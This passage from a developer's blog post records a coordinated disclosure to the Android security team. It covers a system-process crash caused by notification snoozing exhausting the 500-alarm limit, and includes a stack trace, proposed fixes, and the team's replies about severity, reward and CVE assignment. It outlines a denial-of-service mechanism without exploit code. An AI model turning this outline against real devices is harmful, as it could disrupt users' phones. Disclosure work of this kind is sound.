com.android.server.notification.SnoozeHelper.scheduleRepostAtTime(SnoozeHelper.java:513)</span><br><span class="line">        at com.android.server.notification.SnoozeHelper.scheduleRepost(SnoozeHelper.java:498)</span><br><span class="line">        at com.android.server.notification.SnoozeHelper.snooze(SnoozeHelper.java:240)</span><br><span class="line">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeNotificationLocked(NotificationManagerService.java:6978)</span><br><span class="line">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeLocked(NotificationManagerService.java:6955)</span><br><span class="line">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.run(NotificationManagerService.java:6920)</span><br><span class="line">        at android.os.Handler.handleCallback(Handler.java:938)</span><br><span class="line">        at android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class="line">        at android.os.Looper.loopOnce(Looper.java:210)</span><br><span class="line">        at android.os.Looper.loop(Looper.java:299)</span><br><span class="line">        at com.android.server.SystemServer.run(SystemServer.java:951)</span><br><span class="line">        at com.android.server.SystemServer.main(SystemServer.java:641)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:576)</span><br><span class="line">        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1051)</span><br><span class="line">2022-05-27 16:35:11.454 1451-1451/system_process E/AndroidRuntime: *** FATAL EXCEPTION IN SYSTEM PROCESS: main</span><br><span class="line">    java.lang.IllegalStateException: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android</span><br><span class="line">        at com.android.server.alarm.AlarmManagerService.setImpl(AlarmManagerService.java:2087)</span><br><span class="line">        at com.android.server.alarm.AlarmManagerService$5.set(AlarmManagerService.java:2630)</span><br><span class="line">        at android.app.AlarmManager.setImpl(AlarmManager.java:957)</span><br><span class="line">        at android.app.AlarmManager.setImpl(AlarmManager.java:917)</span><br><span class="line">        at android.app.AlarmManager.setExactAndAllowWhileIdle(AlarmManager.java:1185)</span><br><span class="line">        at com.android.server.notification.SnoozeHelper.lambda$scheduleRepostAtTime$2$SnoozeHelper(SnoozeHelper.java:508)</span><br><span class="line">        at com.android.server.notification.SnoozeHelper$$ExternalSyntheticLambda4.run(Unknown Source:10)</span><br><span class="line">        at com.android.server.notification.SnoozeHelper.scheduleRepostAtTime(SnoozeHelper.java:513)</span><br><span class="line">        at com.android.server.notification.SnoozeHelper.scheduleRepost(SnoozeHelper.java:498)</span><br><span class="line">        at com.android.server.notification.SnoozeHelper.snooze(SnoozeHelper.java:240)</span><br><span class="line">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeNotificationLocked(NotificationManagerService.java:6978)</span><br><span class="line">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeLocked(NotificationManagerService.java:6955)</span><br><span class="line">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.run(NotificationManagerService.java:6920)</span><br><span class="line">        at android.os.Handler.handleCallback(Handler.java:938)</span><br><span class="line">        at android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class="line">        at android.os.Looper.loopOnce(Looper.java:210)</span><br><span class="line">        at android.os.Looper.loop(Looper.java:299)</span><br><span class="line">        at com.android.server.SystemServer.run(SystemServer.java:951)</span><br><span class="line">        at com.android.server.SystemServer.main(SystemServer.java:641)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:576)</span><br><span class="line">        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1051)</span><br></pre></td></tr></table></figure>

<h4 id="HWASan-output-if-available"><a href="#HWASan-output-if-available" class="headerlink" title="HWASan output (if available)"></a>HWASan output (if available)</h4><p>……</p>
<h4 id="Does-anyone-else-know-about-this-vulnerability"><a href="#Does-anyone-else-know-about-this-vulnerability" class="headerlink" title="Does anyone else know about this vulnerability?"></a>Does anyone else know about this vulnerability?</h4><ul>
<li>No, this vulnerability is private</li>
<li>Yes, this vulnerability is public or known to third parties</li>
</ul>
<h4 id="How-would-you-like-to-be-publicly-acknowledged-for-your-report"><a href="#How-would-you-like-to-be-publicly-acknowledged-for-your-report" class="headerlink" title="How would you like to be publicly acknowledged for your report?"></a>How would you like to be publicly acknowledged for your report?</h4><blockquote>
<p>If your report is successful we will acknowledge you using this information in the next release.</p>
</blockquote>
<p>It’s my pleasure.</p>
<hr>
<h3 id="What-to-expect"><a href="#What-to-expect" class="headerlink" title="What to expect"></a>What to expect</h3><ol>
<li>You will receive an email confirming we have received your report</li>
<li>The report will be sorted and added to the queue of reports</li>
<li>A member of the team will review your report and determine if it is a valid</li>
<li>During this stage it is common for us to contact you with questions about your report</li>
<li>The report is then triaged and the details of the bug are supplied to the relevant team</li>
<li>Depending on the bug we may take between 7 and 14 days to determine the bug’s severity</li>
<li>If successful we will contact you to inform you of your reward</li>
</ol>
<hr>
<h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3><blockquote>
<p><a href="mailto:&#x79;&#115;&#x79;&#x39;&#x35;&#x30;&#56;&#48;&#x33;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#x79;&#115;&#x79;&#x39;&#x35;&#x30;&#56;&#48;&#x33;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
</blockquote>
<p>I have some suggestions as solutions:</p>
<ol>
<li>Hide the <code>snoozeNotification</code> method for app developers.</li>
<li>Alarms cannot be set for system processes by non-system processes.</li>
<li>Don’t throw an exception for system processes when reaching the maximum limit of alarms, then we can delete the alarm with the longest duration before set a new alarm.</li>
</ol>
<blockquote>
<p><a href="mailto:&#x6a;&#x61;&#x2e;&#46;&#x2e;&#64;&#x67;&#x6f;&#x6f;&#x67;&#x6c;&#x65;&#46;&#99;&#x6f;&#x6d;">&#x6a;&#x61;&#x2e;&#46;&#x2e;&#64;&#x67;&#x6f;&#x6f;&#x67;&#x6c;&#x65;&#46;&#99;&#x6f;&#x6d;</a></p>
</blockquote>
<p>Assigned to <a href="mailto:&#97;&#115;&#46;&#x2e;&#x2e;&#64;&#x67;&#x6f;&#x6f;&#103;&#x6c;&#x65;&#x2e;&#99;&#111;&#109;">&#97;&#115;&#46;&#x2e;&#x2e;&#64;&#x67;&#x6f;&#x6f;&#103;&#x6c;&#x65;&#x2e;&#99;&#111;&#109;</a>.<br>Thank you for submitting this report. We’ve filed an internal report for the Android engineering team to investigate further (specified by the Android ID label). Please follow coordinated disclosure practices, such as keeping this report confidential until we have had time to assess your issue, and if necessary, release an update for Android devices.</p>
<p>PLEASE TAKE THE FOLLOWING ACTIONS NOW, if you have not already:</p>
<ol>
<li>Sign the Google Contributor License Agreement (1).</li>
<li>In a comment below, let us know how you would like to be acknowledged (2) for discovering this potential vulnerability (including company affiliation, if any).</li>
<li>Provide a PoC that reproduces against a recent Android build (not more than 30 days old).</li>
</ol>
<p>The typical lifecycle for a confirmed security vulnerability is as follows:</p>
<ol>
<li>Initial severity rating assessment (subject to change after review by component owners) (3)</li>
<li>Development of an update</li>
<li>Assignment of CVE</li>
<li>Shared under NDA, as part of coordinated disclosure, to Android partners for remediation</li>
<li>Release in a public Android security bulletin</li>
<li>Android Security Rewards payment (if applicable)</li>
</ol>
<p>Most of these steps will typically be communicated in the sidebar. Please note that we may not reply to requests for status updates or information, however we will continue our typical assessment and remediation efforts. This issue will be updated with information once the reported issue is publicly fixed, if not prior.</p>
<p>Thank you,<br>Android Security Team</p>
<p>(1) Contributor license agreement: <a target="_blank" rel="noopener" href="https://cla.developers.google.com/clas">https://cla.developers.google.com/clas</a><br>(2) Android Security Acknowledgements: <a target="_blank" rel="noopener" href="https://source.android.com/security/overview/acknowledgements">https://source.android.com/security/overview/acknowledgements</a><br>(3) Android severity guidelines: <a target="_blank" rel="noopener" href="https://source.android.com/security/overview/updates-resources.html">https://source.android.com/security/overview/updates-resources.html</a></p>
<blockquote>
<p><a href="mailto:&#121;&#115;&#121;&#x39;&#x35;&#48;&#56;&#48;&#51;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#109;">&#121;&#115;&#121;&#x39;&#x35;&#48;&#56;&#48;&#51;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#109;</a></p>
</blockquote>
<p>Thank you for your reply. ACTIONS DONE:</p>
<ol>
<li>I have signed the CLA for only myself.</li>
<li>If my work can help improve AOSP, it’s an honor for me to be acknowledged. I want my information to be displayed like this: Sylvester Yao (姚圣禹, <a href="https://blog.ysy950803.top/">blog.ysy950803.top</a>)</li>
<li>The PoC is an Android Studio Project including source code and APK. Please download the attachment.</li>
</ol>
<blockquote>
<p><a href="mailto:&#x6a;&#97;&#x2e;&#x2e;&#x2e;&#64;&#x67;&#111;&#x6f;&#103;&#x6c;&#x65;&#x2e;&#x63;&#111;&#x6d;">&#x6a;&#97;&#x2e;&#x2e;&#x2e;&#64;&#x67;&#111;&#x6f;&#103;&#x6c;&#x65;&#x2e;&#x63;&#111;&#x6d;</a></p>
</blockquote>
<p>Hello,</p>
<p>Thank you for the additional information as well as your acknowledgement. We will be following our standard investigation and remediation process with this report and ask for your continued confidentiality while we work on this issue.</p>
<p>Thank you,<br>Android Security Team</p>
<blockquote>
<p><a href="mailto:&#101;&#106;&#x2e;&#46;&#46;&#64;&#103;&#111;&#111;&#x67;&#x6c;&#x65;&#46;&#x63;&#x6f;&#x6d;">&#101;&#106;&#x2e;&#46;&#46;&#64;&#103;&#111;&#111;&#x67;&#x6c;&#x65;&#46;&#x63;&#x6f;&#x6d;</a></p>
</blockquote>
<p>Hello,</p>
<p>The Android security team has conducted an initial severity assessment on this report. Based on our published severity assessment matrix (1) it was rated as High severity. This issue has been assigned to the appropriate team for remediation, and we’re targeting a fix for release in an upcoming Android Security Bulletin. We will provide an update on remediation status as it becomes available. We ask for your continued confidentiality as we proceed with our standard investigation and remediation process.</p>
<p>Thank you,<br>Android Security Team<br>(1) Severity Matrix: <a target="_blank" rel="noopener" href="https://source.android.com/security/overview/updates-resources#severity">https://source.android.com/security/overview/updates-resources#severity</a></p>
<blockquote>
<p><a href="mailto:&#121;&#x73;&#121;&#57;&#53;&#x30;&#56;&#x30;&#51;&#64;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#121;&#x73;&#121;&#57;&#53;&#x30;&#56;&#x30;&#51;&#64;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;</a></p>
</blockquote>
<p>Thanks for your efforts!</p>
<p>I will continue to follow this issue and support you in any way I can.</p>
<blockquote>
<p><a href="mailto:&#x79;&#115;&#x79;&#x39;&#53;&#48;&#x38;&#x30;&#51;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#111;&#109;">&#x79;&#115;&#x79;&#x39;&#53;&#48;&#x38;&#x30;&#51;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#111;&#109;</a></p>
</blockquote>
<p>Hello! How is the progress?</p>
<blockquote>
<p><a href="mailto:&#x6a;&#x61;&#x2e;&#46;&#46;&#64;&#103;&#111;&#111;&#x67;&#108;&#101;&#46;&#x63;&#x6f;&#109;">&#x6a;&#x61;&#x2e;&#46;&#46;&#64;&#103;&#111;&#111;&#x67;&#108;&#101;&#46;&#x63;&#x6f;&#109;</a></p>
</blockquote>
<p>Hello,</p>
<p>Thank you for following up! This issue has been fixed and is targeted for release in an upcoming Android Security Bulletin. It will be reviewed for both a CVE and reward eligibility under Android Security Rewards Program rules closer to that time (1). Further details will be provided here when available.</p>
<p>Thank you,<br>Android Security Team</p>
<p>(1) <a target="_blank" rel="noopener" href="https://www.google.com/about/appsecurity/android-rewards/">https://www.google.com/about/appsecurity/android-rewards/</a></p>
<blockquote>
<p><a href="mailto:&#97;&#x6e;&#46;&#x2e;&#x2e;&#64;&#x67;&#x6f;&#x6f;&#103;&#108;&#x65;&#x2e;&#99;&#111;&#x6d;">&#97;&#x6e;&#46;&#x2e;&#x2e;&#64;&#x67;&#x6f;&#x6f;&#103;&#108;&#x65;&#x2e;&#99;&#111;&#x6d;</a></p>
</blockquote>
<p>Congratulations! The rewards committee decided to reward you USD $5,000 for reporting this High severity vulnerability. We are paying for the bug report and proof of concept.</p>
<p>To collect the reward, if you haven’t already, please complete the Android Contributor License Agreement for Individuals, so we can use your test code:<br><a target="_blank" rel="noopener" href="https://cla.developers.google.com/clas">https://cla.developers.google.com/clas</a></p>
<p>You will receive an email with details on the next steps to collect the reward.</p>
<p>Thank you for your contributions to the safety and security of the Android ecosystem.</p>
<p>Best Regards,<br>Android Security Team</p>
<blockquote>
<p><a href="mailto:&#x79;&#x73;&#121;&#57;&#x35;&#x30;&#56;&#48;&#x33;&#64;&#x67;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#109;">&#x79;&#x73;&#121;&#57;&#x35;&#x30;&#56;&#48;&#x33;&#64;&#x67;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#109;</a></p>
</blockquote>
<p>Thank you for your hard work, I am honored to contribute to the Google ecosystem.</p>
<blockquote>
<p><a href="mailto:&#x6a;&#97;&#46;&#46;&#x2e;&#x40;&#103;&#x6f;&#x6f;&#103;&#108;&#101;&#x2e;&#x63;&#x6f;&#109;">&#x6a;&#97;&#46;&#46;&#x2e;&#x40;&#103;&#x6f;&#x6f;&#103;&#108;&#101;&#x2e;&#x63;&#x6f;&#109;</a></p>
</blockquote>
<p>Hello,</p>
<p>We will be releasing a patch for this issue in an upcoming bulletin. It will first be released to partners, then to the public the following month.</p>
<p>If you haven’t already, please complete the Google Contributor License Agreement for Individuals, so we can use your patch and test code (1).</p>
<p>We’d also like to recognize your contribution on our acknowledgements page (2). The acknowledgement information we have on record is “Sylvester Yao (姚圣禹, blog.ysy950803.top)”. Please let us know if it has changed.</p>
<p>We may also make this bug publicly accessible when the fix is submitted to AOSP. Please let us know if you would like to keep the bug private instead.</p>
<p>Your CVE ID is CVE-2022-20414.</p>
<p>Thanks,<br>Android Security Team</p>
<p>(1) <a target="_blank" rel="noopener" href="https://cla.developers.google.com/clas">https://cla.developers.google.com/clas</a><br>(2) <a target="_blank" rel="noopener" href="https://source.android.com/security/overview/acknowledgements">https://source.android.com/security/overview/acknowledgements</a></p>
<blockquote>
<p><a href="mailto:&#121;&#115;&#121;&#x39;&#x35;&#48;&#56;&#48;&#51;&#64;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;">&#121;&#115;&#121;&#x39;&#x35;&#48;&#56;&#48;&#51;&#64;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;</a></p>
</blockquote>
<p>Thanks for your work. Where can I see the fix code?</p>
<blockquote>
<p><a href="mailto:&#106;&#97;&#x2e;&#46;&#x2e;&#x40;&#103;&#111;&#111;&#x67;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;">&#106;&#97;&#x2e;&#46;&#x2e;&#x40;&#103;&#111;&#111;&#x67;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;</a></p>
</blockquote>
<p>Hello,</p>
<p>This is targeted to be released in the November bulletin. Thank you for your continued engagement with the Android VRP!</p>
<p>Best,<br>Android Security Team</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.ysy950803.top">YSY</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.ysy950803.top/2023/02/14/Android%E7%B3%BB%E7%BB%9F%E6%97%A0%E9%99%90%E9%87%8D%E5%90%AF%E6%BC%8F%E6%B4%9E/">https://blog.ysy950803.top/2023/02/14/Android%E7%B3%BB%E7%BB%9F%E6%97%A0%E9%99%90%E9%87%8D%E5%90%AF%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.ysy950803.top" target="_blank">Pig Cat</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Android/">Android</a><a class="post-meta__tags" href="/tags/AOSP/">AOSP</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar-ysy.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://qr.alipay.com/fkx12362diu95oh2aweaac5" target="_blank"><img class="post-qr-code-img" src="/img/love-support.png" alt="支付宝（移动端可点击二维码）"/></a><div class="post-qr-code-desc">支付宝（移动端可点击二维码）</div></li><li class="reward-item"><a href="https://blog.ysy950803.top/img/love-support-wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/love-support-wechat.png" alt="微信（仅支持扫码）"/></a><div class="post-qr-code-desc">微信（仅支持扫码）</div></li></ul></div></div><div class="ads-wrap"><script async crossorigin=anonymous src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8999136091629669"></script><ins class=adsbygoogle data-ad-client=ca-pub-8999136091629669 data-ad-format=fluid data-ad-layout=in-article data-ad-slot=2789809398 style=display:block;text-align:center></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/02/28/%E7%BB%99MIUI%E5%BC%80%E5%8F%91%E4%B8%80%E4%B8%AA%E5%88%B7%E6%96%B0%E7%8E%87%E5%BC%80%E5%85%B3/" title="给MIUI开发一个刷新率开关"><img class="cover" src="/2023/02/28/%E7%BB%99MIUI%E5%BC%80%E5%8F%91%E4%B8%80%E4%B8%AA%E5%88%B7%E6%96%B0%E7%8E%87%E5%BC%80%E5%85%B3/867802e2f5542451c96578a3885647db.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">给MIUI开发一个刷新率开关</div></div></a></div><div class="next-post pull-right"><a href="/2023/02/12/%E5%88%A0%E9%99%A4Android%20Studio%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84JDK%E9%85%8D%E7%BD%AE/" title="删除Android Studio中重复的JDK配置"><img class="cover" src="https://imgconvert.csdnimg.cn/33252e541c8d4a02a31c34ee3d2657c1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">删除Android Studio中重复的JDK配置</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2018/08/03/%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2%E5%BC%80%E5%8F%91%E8%80%85%E9%80%89%E9%A1%B9%E5%85%B3%E9%97%AD%E5%8A%A8%E7%94%BB%E5%90%8E%E4%BD%BF%E5%85%B6%E5%A4%B1%E6%95%88/" title="如何防止开发者选项关闭动画后使其失效"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2018-08-03</div><div class="title">如何防止开发者选项关闭动画后使其失效</div></div></a></div><div><a href="/2019/02/23/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8B%E7%94%B1%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84ANR%E5%88%86%E6%9E%90%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Context/" title="源码茶舍之由一次简单的ANR分析深入了解Context"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-02-23</div><div class="title">源码茶舍之由一次简单的ANR分析深入了解Context</div></div></a></div><div><a href="/2019/04/10/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8Bandroid-externalService%E6%98%AF%E4%BB%80%E4%B9%88%E5%B1%9E%E6%80%A7%EF%BC%9F%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%EF%BC%9F/" title="源码茶舍之android:externalService是什么属性？实现原理？"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-04-10</div><div class="title">源码茶舍之android:externalService是什么属性？实现原理？</div></div></a></div><div><a href="/2019/08/16/Ubuntu%E5%AE%89%E8%A3%85Source%20Insight%E5%AF%BC%E5%85%A5Android%E6%BA%90%E7%A0%81%E5%B9%B6%E8%AE%BE%E7%BD%AE%E4%BB%BFIDEA%E4%B8%BB%E9%A2%98Darcula/" title="Ubuntu安装Source Insight导入Android源码并设置仿IDEA主题Darcula"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-08-16</div><div class="title">Ubuntu安装Source Insight导入Android源码并设置仿IDEA主题Darcula</div></div></a></div><div><a href="/2019/11/02/%E6%BA%90%E7%A0%81%E8%8C%B6%E8%88%8D%E4%B9%8BPackageManager%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%86%8CService%E6%95%B0%E9%87%8F%E9%97%AE%E9%A2%98/" title="源码茶舍之PackageManager获取注册Service数量问题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-02</div><div class="title">源码茶舍之PackageManager获取注册Service数量问题</div></div></a></div><div><a href="/2019/11/19/%E4%B8%BA%E4%BD%95%E7%82%B9%E5%87%BB%E6%8E%A8%E9%80%81%E9%80%9A%E7%9F%A5%E6%89%93%E4%B8%8D%E5%BC%80Activity%EF%BC%9FCalling%20startActivity()%20from%20outside%E2%80%A6%E2%80%A6/" title="为何点击推送通知打不开Activity？Calling startActivity() from outside……"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-19</div><div class="title">为何点击推送通知打不开Activity？Calling startActivity() from outside……</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar-ysy.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">YSY</div><div class="author-info__description">Full-Stack, Android, AI</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">91</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ysy950803"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget donate" id="donate"><div class="item-headline"><i class="fas fa-heartbeat"></i><span>随缘支持</span></div><div class="item-content"><p style="text-align:center;padding:0;margin:0;"><a target="_blank" rel="noopener" href="https://qr.alipay.com/fkx12362diu95oh2aweaac5"><img src="https://blog.ysy950803.top/img/love-support.png" width="200" height="200"/></a></p> <p style="text-align:center;padding:0;margin:0;">移动端点击二维码亦可</p> <p style="text-align:center;padding:0;margin:0;"><u><a target="_blank" rel="noopener" href="https://paypal.me/yaoshengyu">Paypal.me if you like</a></u></p></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Report-description"><span class="toc-number">1.</span> <span class="toc-text">Report description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bug-location"><span class="toc-number">2.</span> <span class="toc-text">Bug location</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Which-product-or-website-have-you-found-a-vulnerability-in"><span class="toc-number">2.1.</span> <span class="toc-text">Which product or website have you found a vulnerability in?</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-problem"><span class="toc-number">3.</span> <span class="toc-text">The problem</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Please-describe-the-technical-details-of-the-vulnerability"><span class="toc-number">3.1.</span> <span class="toc-text">Please describe the technical details of the vulnerability</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Please-briefly-explain-who-can-exploit-the-vulnerability-and-what-they-gain-when-doing-so"><span class="toc-number">3.2.</span> <span class="toc-text">Please briefly explain who can exploit the vulnerability, and what they gain when doing so</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Upload-file"><span class="toc-number">3.3.</span> <span class="toc-text">Upload file</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-cause"><span class="toc-number">4.</span> <span class="toc-text">The cause</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Please-specify-the-steps-to-reproduce-the-issue-including-sample-code-where-appropriate-Please-be-as-detailed-as-possible"><span class="toc-number">4.1.</span> <span class="toc-text">Please specify the steps to reproduce the issue, including sample code where appropriate. Please be as detailed as possible.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Specify-the-build-fingerprint-from-the-device-used-to-reproduce-the-issue-The-issue-should-reproduce-on-a-recent-build-within-the-last-30-days"><span class="toc-number">4.2.</span> <span class="toc-text">Specify the build fingerprint from the device used to reproduce the issue. The issue should reproduce on a recent build (within the last 30 days).</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Provide-a-Proof-of-Concept-complete-Android-Studio-project-source-code-including-an-Android-bp-file-or-similar-artifacts"><span class="toc-number">4.3.</span> <span class="toc-text">Provide a Proof of Concept, complete Android Studio project, source code including an Android.bp file, or similar artifacts.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Provide-crash-artifacts-including-stack-trace-if-available"><span class="toc-number">4.4.</span> <span class="toc-text">Provide crash artifacts including stack trace (if available).</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HWASan-output-if-available"><span class="toc-number">4.5.</span> <span class="toc-text">HWASan output (if available)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Does-anyone-else-know-about-this-vulnerability"><span class="toc-number">4.6.</span> <span class="toc-text">Does anyone else know about this vulnerability?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#How-would-you-like-to-be-publicly-acknowledged-for-your-report"><span class="toc-number">4.7.</span> <span class="toc-text">How would you like to be publicly acknowledged for your report?</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-to-expect"><span class="toc-number">5.</span> <span class="toc-text">What to expect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Comments"><span class="toc-number">6.</span> <span class="toc-text">Comments</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/26/Levenshtein%E7%BC%96%E8%BE%91%E8%B7%9D%E7%A6%BB%E7%AE%97%E6%B3%95%E5%88%9D%E4%BD%93%E9%AA%8C/" title="Levenshtein编辑距离算法初体验">Levenshtein编辑距离算法初体验</a><time datetime="2024-08-26T03:37:45.000Z" title="发表于 2024-08-26 11:37:45">2024-08-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/26/%E7%94%A8MySQL%E7%9A%84FROM-UNIXTIME%E5%87%BD%E6%95%B0%E8%BD%AC%E6%8D%A2%E6%97%B6%E9%97%B4%E6%A0%BC%E5%BC%8F/" title="用MySQL的FROM_UNIXTIME函数转换时间格式">用MySQL的FROM_UNIXTIME函数转换时间格式</a><time datetime="2024-08-26T02:26:57.000Z" title="发表于 2024-08-26 10:26:57">2024-08-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/25/%E5%A6%82%E4%BD%95%E9%99%90%E5%88%B6%E5%8F%AA%E8%83%BD%E9%80%9A%E8%BF%87%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%EF%BC%88Apache%EF%BC%89/" title="如何限制只能通过域名访问网站（Apache）">如何限制只能通过域名访问网站（Apache）</a><time datetime="2024-08-25T06:54:44.000Z" title="发表于 2024-08-25 14:54:44">2024-08-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/23/%E5%90%88%E4%BD%9C%E7%8B%AC%E7%AB%8B%E5%BC%80%E5%8F%91%E9%A1%B9%E7%9B%AE%EF%BC%9ADaak%E8%AE%B0%E8%B4%A6/" title="合作独立开发项目：Daak记账">合作独立开发项目：Daak记账</a><time datetime="2024-08-23T06:42:54.000Z" title="发表于 2024-08-23 14:42:54">2024-08-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" 